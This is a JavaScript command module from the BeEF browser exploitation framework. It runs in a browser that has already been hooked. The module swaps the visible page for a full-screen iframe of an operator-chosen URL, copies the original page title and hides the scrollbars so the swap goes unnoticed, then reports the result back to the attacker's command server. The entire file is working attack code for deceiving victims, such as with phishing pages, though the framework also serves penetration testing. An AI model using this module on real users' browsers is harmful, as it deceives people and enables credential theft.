//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var result = 'Iframe successfully created!';
	var title = '<%= @iframe_title %>';
	var iframe_src = '<%= @iframe_src %>';
	var sent = false;

	$j("iframe").remove();
	
	beef.dom.createIframe('fullscreen', 'get', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });
	document.body.scroll = "no";
	document.documentElement.style.overflow = 'hidden';

	setTimeout(function() { 
		if(!sent) {
			result = 'Iframe failed to load, timeout';
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
			document.title = iframe_src + " is not available";
			sent = true;
		}
	}, <%= @iframe_timeout %>);

});
